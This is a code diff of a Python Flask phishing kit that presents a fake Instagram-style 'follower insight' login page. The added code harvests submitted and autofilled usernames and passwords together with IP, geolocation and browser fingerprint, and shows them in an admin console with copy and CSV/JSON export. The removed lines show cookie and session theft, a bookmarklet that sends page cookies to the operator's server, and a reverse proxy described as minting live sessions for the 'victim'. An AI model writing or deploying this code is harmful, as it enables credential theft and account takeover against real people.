-    return (ADMIN_HTML.replace("__BODY__", body)
-            .replace("__CAPS__", str(caps))
-            .replace("__LOGS__", str(logs))
-            .replace("__PROXY__", "on" if PROXY_ON else "off"))
+    return ADMIN_HTML.replace("__BODY__", body).replace("__LOGS__", str(logs))
 
 
 def row_html(r: sqlite3.Row) -> str:
-    nlog = r["nlog"]
-    if nlog:
-        badge = f'<span class="pill login">{nlog} cred</span>'
-    elif r["reason"] == "proxy_session":
-        badge = '<span class="pill sess">session</span>'
-    elif r["reason"] == "bookmarklet":
-        badge = '<span class="pill grab">bridge</span>'
-    elif r["src"] == "autofill":
-        badge = '<span class="pill auto">autofill</span>'
-    else:
-        badge = '<span class="pill cap">visit</span>'
-
     place = ", ".join(x for x in (r["city"], r["country"]) if x) or "-"
     return (
         f'<tr data-id="{r["id"]}">'
@@ -1621,10 +1164,12 @@ def row_html(r: sqlite3.Row) -> str:
         f'<td>{(r["created_at"] or "")[11:19]}</td>'
         f'<td>{escape(place)}</td>'
         f'<td>{escape(r["ip"] or "-")}</td>'
-        f'<td class="mono">{escape((r["ua"] or "")[:110])}</td>'
-        f'<td>{len(r["js_cookies"] or "") + len(r["cookie_header"] or "")}b</td>'
-        f'<td>{badge}</td>'
-        f'<td><a href="/admin/capture/{r["id"]}">open</a></td>'
+        f'<td class="u"><span>{escape(r["username"] or "")}</span> '
+        f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
+        f'<td class="p"><span>{escape(r["password"] or "")}</span> '
+        f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
+        f'<td><span class="mono">{escape(r["source"] or "")}</span></td>'
+        f'<td><a href="/admin/{r["id"]}">open</a></td>'
         f"</tr>"
     )
 
@@ -1646,131 +1191,75 @@ def finalize(resp: Response) -> Response:
     return resp
 
 
-@app.route("/")
-def index():
-    ip = client_ip()
-    info = geo(ip)
-    header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
-
-    emit("PAGE_VIEW", {
-        "cid": g.cid, "ip": ip,
-        "ua": request.headers.get("User-Agent", "")[:220],
-        "referer": request.headers.get("Referer", "")[:220],
-        "accept_lang": request.headers.get("Accept-Language", "")[:120],
-        "cookie_header": header_cookie[:1200],
-        "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    }, boxes_for(header_cookie, ""))
-
-    if session.get("user"):
-        return redirect(url_for("dashboard"))
-    return render_template_string(LOGIN_PAGE_HTML)
-
-
-@app.route("/collect", methods=["POST"])
-def collect():
-    ip = client_ip()
-    if not rate_ok(ip, 150):
-        return ("", 429)
-
+def read_json() -> dict:
     data = request.get_json(silent=True)
     if not isinstance(data, dict):
         try:
             data = json.loads(request.get_data(as_text=True) or "{}")
         except ValueError:
             data = {}
-        if not isinstance(data, dict):
-            data = {}
+    return data if isinstance(data, dict) else {}
 
-    cookies = filter_cookie_string((data.get("cookies") or "").strip())
-    local = data.get("local") if isinstance(data.get("local"), list) else []
-    sess = data.get("sess") if isinstance(data.get("sess"), list) else []
-    meta = data.get("meta") if isinstance(data.get("meta"), dict) else {}
-    reason = (data.get("reason") or "unknown")[:24]
-    sid = (data.get("sid") or "")[:24]
 
-    digest = digest_of(cookies, "|".join(map(str, local)), "|".join(map(str, sess)),
-                       json.dumps(meta, sort_keys=True))
-    if reason == "poll" and is_duplicate(g.cid, digest):
-        return ("", 204)
-
+def save_credential(username: str, password: str, source: str, sid: str, meta: dict) -> int:
+    ip = client_ip()
     info = geo(ip)
-    header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
+    place = ", ".join(x for x in (info.get("city"), info.get("country")) if x) or "-"
+    ua = request.headers.get("User-Agent", "")
 
-    cap_id = store_capture(
-        cid=g.cid, sid=sid, reason=reason, digest=digest, ip=ip,
-        ua=request.headers.get("User-Agent", ""),
-        referer=request.headers.get("Referer", ""),
-        accept_lang=request.headers.get("Accept-Language", ""),
-        cookie_header=header_cookie, js_cookies=cookies,
-        storage_json=json.dumps({"local": local, "session": sess}, ensure_ascii=False),
+    cred_id = store_cred(
+        cid=g.cid, sid=sid[:24], source=source[:16], username=username[:200],
+        password=password[:300], ip=ip, ua=ua,
+        referer=request.headers.get("Referer", "")[:300],
+        accept_lang=request.headers.get("Accept-Language", "")[:120],
         meta_json=json.dumps(meta, ensure_ascii=False),
         country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
         geo_json=json.dumps(info, ensure_ascii=False),
         created_at=datetime.now(timezone.utc).isoformat(timespec="seconds"),
     )
 
-    emit("COOKIE_SNAPSHOT", {
-        "cid": g.cid, "cap": cap_id, "reason": reason, "ip": ip,
-        "ua": request.headers.get("User-Agent", "")[:200],
-        "referer": request.headers.get("Referer", "")[:200],
-        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
-        "localStorage": local[:8],
-        "sessionStorage": sess[:8],
-        "fingerprint": meta,
-        "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    }, boxes_for(header_cookie, cookies))
+    emit(
+        {
+            "id": cred_id, "cid": g.cid, "ip": ip, "source": source,
+            "USERNAME": username, "PASSWORD": password,
+            "ua": ua[:200], "referer": request.headers.get("Referer", "")[:200],
+            "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
+            "fingerprint": {k: meta.get(k) for k in ("platform", "lang", "tz", "screen", "cores")
+                            if meta.get(k)},
+        },
+        [cred_box(f"🔑 CREDENTIAL · {source} · #{cred_id}", username, password),
+         ctx_box(ip, source, ua, place)],
+    )
+    session["last_cred"] = cred_id
+    return cred_id
 
-    session["cid"] = g.cid
-    session["last_cap"] = cap_id
-    return ("", 204)
+
+@app.route("/")
+def index():
+    if session.get("user"):
+        return redirect(url_for("dashboard"))
+    return render_template_string(LOGIN_PAGE_HTML)
 
 
 @app.route("/credential", methods=["POST"])
 def credential():
     ip = client_ip()
-    if not rate_ok(ip, 80):
+    if not rate_ok(ip, 120):
         return ("", 429)
 
-    data = request.get_json(silent=True)
-    if not isinstance(data, dict):
-        try:
-            data = json.loads(request.get_data(as_text=True) or "{}")
-        except ValueError:
-            data = {}
-        if not isinstance(data, dict):
-            data = {}
-
+    data = read_json()
     username = (data.get("username") or "").strip()
     password = data.get("password") or ""
     source = (data.get("source") or "autofill")[:16]
+    sid = (data.get("sid") or "")[:24]
+    meta = data.get("meta") if isinstance(data.get("meta"), dict) else {}
+
     if not (username or password):
         return ("", 204)
+    if is_duplicate(g.cid, username[:200], password[:300]):
+        return ("", 204)
 
-    cookies = filter_cookie_string((data.get("cookies") or "").strip())
-    local = data.get("local") if isinstance(data.get("local"), list) else []
-    sess = data.get("sess") if isinstance(data.get("sess"), list) else []
-
-    cap_id = session.get("last_cap") or 0
-    header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
-    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
-
-    store_login(
-        capture_id=cap_id, source=source, username=username, password=password, ip=ip,
-        ua=request.headers.get("User-Agent", ""), cookie_header=header_cookie,
-        js_cookies=cookies,
-        meta_json=json.dumps({"local": local, "session": sess}, ensure_ascii=False),
-        created_at=stamp,
-    )
-
-    emit("CREDENTIAL", {
-        "cid": g.cid, "cap": cap_id, "ip": ip, "source": source,
-        "USERNAME": username, "PASSWORD": password,
-        "ua": request.headers.get("User-Agent", "")[:200],
-        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
-        "localStorage": local[:8],
-        "sessionStorage": sess[:8],
-    }, [cred_box(f"🔑 CREDENTIALS · {source}", username, password)]
-       + boxes_for(header_cookie, cookies))
+    save_credential(username, password, source, sid, meta)
     return ("", 204)
 
 
@@ -1789,108 +1278,26 @@ def login():
         payload = {}
     if not isinstance(payload, dict):
         payload = {}
-
-    cookies = filter_cookie_string((payload.get("cookies") or "").strip())
     meta = payload.get("meta") if isinstance(payload.get("meta"), dict) else {}
-    local = payload.get("local") if isinstance(payload.get("local"), list) else []
-    sess = payload.get("sess") if isinstance(payload.get("sess"), list) else []
 
     try:
         visit = int(request.cookies.get("vc", "0")) + 1
     except ValueError:
         visit = 1
 
-    info = geo(ip)
-    header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
-    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
-
-    cap_id = store_capture(
-        cid=g.cid, sid=(payload.get("sid") or "")[:24], reason="login", digest="",
-        ip=ip, ua=request.headers.get("User-Agent", ""),
-        referer=request.headers.get("Referer", ""),
-        accept_lang=request.headers.get("Accept-Language", ""),
-        cookie_header=header_cookie, js_cookies=cookies,
-        storage_json=json.dumps({"local": local, "session": sess}, ensure_ascii=False),
-        meta_json=json.dumps(meta, ensure_ascii=False),
-        country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
-        geo_json=json.dumps(info, ensure_ascii=False), created_at=stamp,
-    )
-    store_login(
-        capture_id=cap_id, source="submit", username=username, password=password, ip=ip,
-        ua=request.headers.get("User-Agent", ""), cookie_header=header_cookie,
-        js_cookies=cookies, meta_json=json.dumps(meta, ensure_ascii=False), created_at=stamp,
-    )
-
-    emit("LOGIN", {
-        "cid": g.cid, "cap": cap_id, "ip": ip, "visit": visit,
-        "USERNAME": username, "PASSWORD": password,
-        "ua": request.headers.get("User-Agent", "")[:200],
-        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
-        "fingerprint": meta,
-        "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    }, [cred_box(f"🔑 CREDENTIALS · submit · visit #{visit}", username, password)]
-       + boxes_for(header_cookie, cookies))
+    cred_id = save_credential(username, password, "submit", (payload.get("sid") or ""), meta)
 
     session.update({
         "user": username,
         "login_count": session.get("login_count", 0) + 1,
-        "browser_cookies": cookies[:8000],
-        "browser_meta": meta,
-        "last_login": stamp,
-        "last_cap": cap_id,
+        "last_login": datetime.now(timezone.utc).isoformat(timespec="seconds"),
+        "last_cred": cred_id,
     })
 
-    # proxy on: hand the victim to the real login page so a live session is minted
-    resp = redirect("/accounts/login/" if PROXY_ON else url_for("dashboard"))
+    resp = redirect(url_for("dashboard"))
     resp.set_cookie("vc", str(visit), max_age=COOKIE_MAX_AGE, samesite="Lax")
     resp.set_cookie("last_user", username, max_age=COOKIE_MAX_AGE, samesite="Lax")
-    resp.set_cookie("login_ts", stamp, max_age=COOKIE_MAX_AGE, samesite="Lax")
     return resp
-
-
-@app.get("/bookmarklet")
-def bookmarklet():
-    js = (
-        "javascript:(function(){"
-        "var d=document.cookie;"
-        "if(!d){alert('no cookies on this page');return;}"
-        "var u=location.origin+location.pathname;"
-        "fetch('" + request.host_url.rstrip("/") + "/c?u='+encodeURIComponent(u)"
-        "+'&d='+encodeURIComponent(d),{mode:'no-cors',keepalive:true});"
-        "alert('sent '+d.length+' bytes to insight');"
-        "})()"
-    )
-    return Response(BOOKMARKLET_PAGE.replace("__JS__", escape(js)), mimetype="text/html")
-
-
-@app.get("/c")
-def grab():
-    ip = client_ip()
-    if not rate_ok(ip, 40):
-        return ("", 429)
-
-    cookies = filter_cookie_string(request.args.get("d", ""))
-    if not cookies:
-        return ("", 204)
-
-    info = geo(ip)
-    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
-    cap_id = store_capture(
-        cid=g.cid, sid="bridge", reason="bookmarklet", digest="",
-        ip=ip, ua=request.headers.get("User-Agent", ""),
-        referer=request.args.get("u", "")[:300], accept_lang="",
-        cookie_header="", js_cookies=cookies,
-        storage_json="{}", meta_json="{}",
-        country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
-        geo_json=json.dumps(info, ensure_ascii=False), created_at=stamp,
-    )
-
-    emit("COOKIE_BRIDGE", {
-        "cid": g.cid, "cap": cap_id, "ip": ip,
-        "from": request.args.get("u", "")[:200],
-        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()},
-    }, boxes_for("", cookies))
-    return ("", 204)
 
 
 @app.route("/dashboard")
@@ -1899,16 +1306,7 @@ def dashboard():
     if not username:
         return redirect(url_for("index"))
 
-    page = render_template_string(
-        RESULTS_PAGE_HTML,
-        followers=random.randint(100, 1000),
-        unfollowed=random.randint(50, 500),
-        you_unfollowed=random.randint(50, 600),
-        not_following_back=random.randint(50, 500),
-        you_not_following=random.randint(50, 600),
-        ghost_followers=random.randint(10, 200),
-        blocked_you=random.randint(0, 50),
-    )
+    page = render_template_string(RESULTS_PAGE_HTML)
     page = page.replace("your.handle", str(escape(username)))
     page = page.replace(">YO<", ">" + make_initials(username) + "<")
     return page
@@ -1916,69 +1314,63 @@ def dashboard():
 
 @app.route("/cookies")
 def cookies_view():
-    cap = session.get("last_cap")
+    """Last credential this browser submitted (cookies are no longer captured)."""
+    cred = session.get("last_cred")
     conn = connect()
     try:
-        row = (conn.execute("SELECT * FROM captures WHERE id=?", (cap,)).fetchone()
-               if cap else
-               conn.execute("SELECT * FROM captures WHERE cid=? ORDER BY id DESC LIMIT 1",
+        row = (conn.execute("SELECT * FROM creds WHERE id=?", (cred,)).fetchone()
+               if cred else
+               conn.execute("SELECT * FROM creds WHERE cid=? ORDER BY id DESC LIMIT 1",
                             (g.cid,)).fetchone())
-        creds = conn.execute(
-            "SELECT source, username, password, created_at FROM logins WHERE capture_id=? ORDER BY id",
-            (row["id"] if row else 0,),
-        ).fetchall()
     finally:
         conn.close()
 
     if not row:
-        return jsonify({"ok": False, "message": "no capture yet for this browser"})
+        return jsonify({"ok": False, "message": "nothing captured for this browser yet"})
 
     return jsonify({
         "ok": True,
-        "capture": row["id"],
+        "id": row["id"],
         "created_at": row["created_at"],
-        "client_id": row["cid"],
+        "source": row["source"],
+        "username": row["username"],
+        "password": row["password"],
         "ip": row["ip"],
         "geo": json.loads(row["geo_json"] or "{}"),
-        "cookie_header": row["cookie_header"],
-        "js_cookies": parse_cookie_string(row["js_cookies"] or ""),
-        "storage": json.loads(row["storage_json"] or "{}"),
         "fingerprint": json.loads(row["meta_json"] or "{}"),
-        "credentials": [dict(c) for c in creds],
     })
+
+
+@app.route("/console")
+def console_redirect():
+    return redirect(url_for("admin"))
 
 
 @app.route("/logout")
 def logout():
-    for k in ("user", "browser_cookies", "browser_meta", "last_login", "last_cap"):
+    for k in ("user", "last_login", "last_cred"):
         session.pop(k, None)
     return redirect(url_for("index"))
 
 
 # ---------------- admin ----------------
+ADMIN_SELECT = """SELECT c.id, c.created_at, c.ip, c.ua, c.source, c.username, c.password,
+                         c.country, c.city FROM creds c"""
+
+
 @app.route("/admin")
 def admin():
     if not admin_ok():
         return render_template_string(LOGIN_ADMIN_HTML), 401
 
     q = (request.args.get("q") or "").strip()
-    only = request.args.get("only") or "all"
 
-    sql = """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.cookie_header,
-                    c.country, c.city, c.reason,
-                    (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog,
-                    (SELECT source FROM logins l WHERE l.capture_id=c.id ORDER BY id LIMIT 1) AS src
-             FROM captures c"""
-    where, params = [], []
+    sql = ADMIN_SELECT
+    params: list = []
     if q:
-        where.append("(c.ip LIKE ? OR c.ua LIKE ? OR c.city LIKE ? OR c.country LIKE ? OR c.cid LIKE ?"
-                     " OR c.js_cookies LIKE ? OR c.cookie_header LIKE ?"
-                     " OR c.id IN (SELECT capture_id FROM logins WHERE username LIKE ?))")
-        params += [f"%{q}%"] * 7 + [f"%{q}%"]
-    if only == "logins":
-        where.append("(SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) > 0")
-    if where:
-        sql += " WHERE " + " AND ".join(where)
+        sql += " WHERE (c.ip LIKE ? OR c.ua LIKE ? OR c.city LIKE ? OR c.country LIKE ?" \
+               " OR c.cid LIKE ? OR c.username LIKE ? OR c.password LIKE ? OR c.source LIKE ?)"
+        params += [f"%{q}%"] * 8
     sql += " ORDER BY c.id DESC LIMIT 300"
 
     conn = connect()
@@ -1988,23 +1380,22 @@ def admin():
         conn.close()
 
     banner = "" if ADMIN_TOKEN else (
-        '<div class="warn">ADMIN_TOKEN unset — console is public. Set it in Render env.</div>'
+        '<div class="warn">ADMIN_TOKEN unset — console is public. Set it in the environment.</div>'
     )
     body = (
         banner
         + '<form method="get" style="margin-bottom:14px;display:flex;gap:8px;flex-wrap:wrap">'
-        f'<input name="q" value="{escape(q)}" placeholder="search ip / ua / city / username / cookie"'
+        f'<input name="q" value="{escape(q)}" placeholder="search ip / user / pass / ua / city"'
         ' style="flex:1;min-width:220px;background:#141419;border:1px solid #232329;color:#ececf1;'
         'padding:9px 12px;border-radius:9px;font:inherit;font-size:12.5px;outline:none">'
         '<button class="btn" type="submit">search</button>'
-        '<a class="btn" href="/admin?only=logins">only credentials</a>'
         '<a class="btn" href="/admin">reset</a></form>'
         '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
-        '<th>ua</th><th>bytes</th><th>type</th><th></th></tr></thead>'
+        '<th>username</th><th>password</th><th>source</th><th></th></tr></thead>'
         f'<tbody id="feed">{"".join(row_html(r) for r in rows)}</tbody></table>'
     )
     if not rows:
-        body += '<div class="empty">no captures yet — open the login link</div>'
+        body += '<div class="empty">no credentials yet — open the login link</div>'
     return render_admin(body)
 
 
@@ -2016,105 +1407,67 @@ def admin_feed():
     since = int(since) if since.isdigit() else 0
     conn = connect()
     try:
-        rows = conn.execute(
-            """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.cookie_header,
-                      c.country, c.city, c.reason,
-                      (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog,
-                      (SELECT source FROM logins l WHERE l.capture_id=c.id ORDER BY id LIMIT 1) AS src
-               FROM captures c WHERE c.id > ? ORDER BY c.id DESC LIMIT 40""",
-            (since,),
-        ).fetchall()
+        rows = conn.execute(ADMIN_SELECT + " WHERE c.id > ? ORDER BY c.id DESC LIMIT 40",
+                            (since,)).fetchall()
     finally:
         conn.close()
     last = max([r["id"] for r in rows], default=since)
     return jsonify({"rows": [row_html(r) for r in rows], "last": last})
 
 
-@app.route("/admin/capture/<int:cap_id>")
-def admin_capture(cap_id: int):
+@app.route("/admin/<int:cred_id>")
+def admin_credential(cred_id: int):
     if not admin_ok():
         return render_template_string(LOGIN_ADMIN_HTML), 401
 
     conn = connect()
     try:
-        cap = conn.execute("SELECT * FROM captures WHERE id=?", (cap_id,)).fetchone()
-        logs = conn.execute("SELECT * FROM logins WHERE capture_id=? ORDER BY id", (cap_id,)).fetchall()
+        row = conn.execute("SELECT * FROM creds WHERE id=?", (cred_id,)).fetchone()
     finally:
         conn.close()
 
-    if not cap:
+    if not row:
         abort(404)
 
-    def block(title: str, content: str, cls: str = "") -> str:
-        return (f'<div class="block {cls}"><h2>{title} '
-                f'<button class="btn" onclick="copy(this)">copy</button></h2>'
-                f"<pre>{escape(content) or '-'}</pre></div>")
+    fp = json.dumps(json.loads(row["meta_json"] or "{}"), indent=2, ensure_ascii=False)
+    ginfo = json.dumps(json.loads(row["geo_json"] or "{}"), indent=2, ensure_ascii=False)
 
-    def pairs_block(title: str, pairs: list, cls: str) -> str:
-        if not pairs:
-            return ""
-        text = "\n".join(f"{k} = {v}" for k, v in pairs)
-        return block(f"{title} · {len(pairs)}", text, cls)
-
-    fp = json.dumps(json.loads(cap["meta_json"] or "{}"), indent=2, ensure_ascii=False)
-    storage = json.loads(cap["storage_json"] or "{}")
-    ginfo = json.dumps(json.loads(cap["geo_json"] or "{}"), indent=2, ensure_ascii=False)
-
-    hf, hi, ho = split_cookie_string(cap["cookie_header"] or "")
-    jf, ji, jo = split_cookie_string(cap["js_cookies"] or "")
-
-    creds_html = ""
-    for l in logs:
-        lf, li, lo = split_cookie_string(l["js_cookies"] or "")
-        creds_html += (
-            f'<div class="block cred"><h2>🔑 credentials · {escape(l["source"] or "")} · '
-            f'{escape(l["created_at"] or "")} '
-            f'<button class="btn" onclick="copy(this)">copy</button></h2>'
-            f'<pre><b>username</b> {escape(l["username"] or "")}\n'
-            f'<b>password</b> {escape(l["password"] or "")}\n'
-            f'<b>ip</b> {escape(l["ip"] or "")}\n'
-            f'<b>ua</b> {escape((l["ua"] or "")[:300])}\n'
-            f'<b>cookies</b> fb {len(lf)} · ig {len(li)} · other {len(lo)}</pre></div>'
-        )
-
-    cookie_html = (
-        pairs_block("📘 facebook cookies · header", hf, "ck-fb")
-        + pairs_block("📘 facebook cookies · js", jf, "ck-fb")
-        + pairs_block("📸 instagram cookies · header", hi, "ck-ig")
-        + pairs_block("📸 instagram cookies · js", ji, "ck-ig")
-        + pairs_block("🍪 other cookies · header", ho, "ck-other")
-        + pairs_block("🍪 other cookies · js", jo, "ck-other")
+    cred_html = (
+        '<div class="cred">'
+        f'<div class="row"><span class="k">username</span>'
+        f'<span class="v u" id="uv">{escape(row["username"] or "")}</span>'
+        f'<button class="btn cp" onclick="cp(this)">copy</button></div>'
+        f'<div class="row"><span class="k">password</span>'
+        f'<span class="v p" id="pv">{escape(row["password"] or "")}</span>'
+        f'<button class="btn cp" onclick="cp(this)">copy</button></div>'
+        '</div>'
     )
 
     body = (
         f'<a class="btn" href="/admin">← back</a> '
-        f'<form class="inline" method="post" action="/admin/delete/{cap_id}" '
-        f'onsubmit="return confirm(\'delete capture {cap_id}?\')">'
+        f'<form class="inline" method="post" action="/admin/delete/{cred_id}" '
+        f'onsubmit="return confirm(\'delete #{cred_id}?\')">'
         f'<button class="btn" type="submit">delete</button></form>'
         f'<div style="height:16px"></div>'
-        f'<div class="block"><h2>capture #{cap["id"]} · {escape(cap["reason"] or "")}</h2>'
-        f'<pre>client_id {escape(cap["cid"] or "")}\nsession   {escape(cap["sid"] or "")}\n'
-        f'time      {escape(cap["created_at"] or "")}\nip        {escape(cap["ip"] or "")}\n'
-        f'ua        {escape(cap["ua"] or "")}\nreferer   {escape(cap["referer"] or "")}\n'
-        f'lang      {escape(cap["accept_lang"] or "")}</pre></div>'
-        + creds_html
-        + cookie_html
-        + block("localStorage", "\n".join(storage.get("local", [])) or "")
-        + block("sessionStorage", "\n".join(storage.get("session", [])) or "")
-        + block("fingerprint", fp)
-        + block("geo / network", ginfo)
+        f'<div class="block"><h2>credential #{row["id"]} · {escape(row["source"] or "")}</h2>'
+        f'<pre>client_id {escape(row["cid"] or "")}\nsession   {escape(row["sid"] or "")}\n'
+        f'time      {escape(row["created_at"] or "")}\nip        {escape(row["ip"] or "")}\n'
+        f'ua        {escape(row["ua"] or "")}\nreferer   {escape(row["referer"] or "")}\n'
+        f'lang      {escape(row["accept_lang"] or "")}</pre></div>'
+        + cred_html
+        + f'<div class="block"><h2>fingerprint</h2><pre>{escape(fp)}</pre></div>'
+        + f'<div class="block"><h2>geo / network</h2><pre>{escape(ginfo)}</pre></div>'
     )
     return render_admin(body)
 
 
-@app.route("/admin/delete/<int:cap_id>", methods=["POST"])
-def admin_delete(cap_id: int):
+@app.route("/admin/delete/<int:cred_id>", methods=["POST"])
+def admin_delete(cred_id: int):
     if not admin_ok():
         return redirect(url_for("admin"))
     conn = connect()
     try:
-        conn.execute("DELETE FROM logins WHERE capture_id=?", (cap_id,))
-        conn.execute("DELETE FROM captures WHERE id=?", (cap_id,))
+        conn.execute("DELETE FROM creds WHERE id=?", (cred_id,))
         conn.commit()
     finally:
         conn.close()
@@ -2129,8 +1482,7 @@ def admin_export():
     fmt = request.args.get("fmt", "json")
     conn = connect()
     try:
-        caps = conn.execute("SELECT * FROM captures ORDER BY id").fetchall()
-        logs = conn.execute("SELECT * FROM logins ORDER BY id").fetchall()
+        rows = conn.execute("SELECT * FROM creds ORDER BY id").fetchall()
     finally:
         conn.close()
 
@@ -2139,27 +1491,17 @@ def admin_export():
     if fmt == "csv":
         buf = io.StringIO()
         w = csv.writer(buf)
-        w.writerow(["capture_id", "created_at", "ip", "country", "city", "ua", "reason",
-                    "cookie_header", "js_cookies", "source", "username", "password"])
-        by_cap = {}
-        for l in logs:
-            by_cap.setdefault(l["capture_id"], []).append(l)
-        for c in caps:
-            ls = by_cap.get(c["id"]) or [None]
-            for l in ls:
-                w.writerow([
-                    c["id"], c["created_at"], c["ip"], c["country"], c["city"], c["ua"],
-                    c["reason"], c["cookie_header"], c["js_cookies"],
-                    (l["source"] if l else ""), (l["username"] if l else ""),
-                    (l["password"] if l else ""),
-                ])
+        w.writerow(["id", "created_at", "ip", "country", "city", "source",
+                    "username", "password", "ua", "referer"])
+        for r in rows:
+            w.writerow([r["id"], r["created_at"], r["ip"], r["country"], r["city"],
+                        r["source"], r["username"], r["password"], r["ua"], r["referer"]])
         return Response(buf.getvalue(), mimetype="text/csv",
                         headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.csv"})
 
     payload = {
         "exported_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
-        "captures": [dict(c) for c in caps],
-        "logins": [dict(l) for l in logs],
+        "credentials": [dict(r) for r in rows],
     }
     return Response(json.dumps(payload, indent=2, ensure_ascii=False), mimetype="application/json",
                     headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.json"})
@@ -2169,30 +1511,11 @@ def admin_export():
 def healthz():
     conn = connect()
     try:
-        caps = conn.execute("SELECT COUNT(*) c FROM captures").fetchone()["c"]
-        logs = conn.execute("SELECT COUNT(*) c FROM logins").fetchone()["c"]
+        n = conn.execute("SELECT COUNT(*) c FROM creds").fetchone()["c"]
     finally:
         conn.close()
-    return jsonify({"ok": True, "captures": caps, "credentials": logs,
-                    "geo": GEO_ENABLED, "proxy": PROXY_ON, "admin_locked": bool(ADMIN_TOKEN)})
-
-
-# ---------------- proxy catch-all (must stay last) ----------------
-@app.get("/ig/")
-@app.get("/ig")
-def proxy_root():
-    if not PROXY_ON:
-        abort(404)
-    return proxy_request("")
-
-
-@app.route("/<path:path>", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"])
-def proxy_any(path: str):
-    if not PROXY_ON:
-        abort(404)
-    if path.split("/")[0] in ("admin", "collect", "credential", "bookmarklet", "healthz"):
-        abort(404)
-    return proxy_request(path)
+    return jsonify({"ok": True, "credentials": n, "geo": GEO_ENABLED,
+                    "admin_locked": bool(ADMIN_TOKEN)})
 
 
 # ---------------- errors ----------------
@@ -2209,19 +1532,19 @@ p{color:#8e8e8e;margin:10px 0 24px}a{color:#0095f6;text-decoration:none;font-wei
 @app.errorhandler(404)
 def e404(_):
     return render_template_string(ERROR_HTML.replace("__C__", "404")
-                                 .replace("__M__", "page not found")), 404
+                                  .replace("__M__", "page not found")), 404
 
 
 @app.errorhandler(429)
 def e429(_):
     return render_template_string(ERROR_HTML.replace("__C__", "429")
-                                 .replace("__M__", "slow down a moment")), 429
+                                  .replace("__M__", "slow down a moment")), 429
 
 
 @app.errorhandler(500)
 def e500(_):
     return render_template_string(ERROR_HTML.replace("__C__", "500")
-                                 .replace("__M__", "something broke")), 500
+                                  .replace("__M__", "something broke")), 500
 
 
 LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
@@ -2243,5 +1566,4 @@ init_db()
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", "5000"))
     logger.info("console: http://localhost:%s/admin  (token set: %s)", port, bool(ADMIN_TOKEN))
-    logger.info("proxy: %s (%s)", "on" if PROXY_ON else "off", PROXY_HOST)
     app.run(host="0.0.0.0", port=port, debug=False)
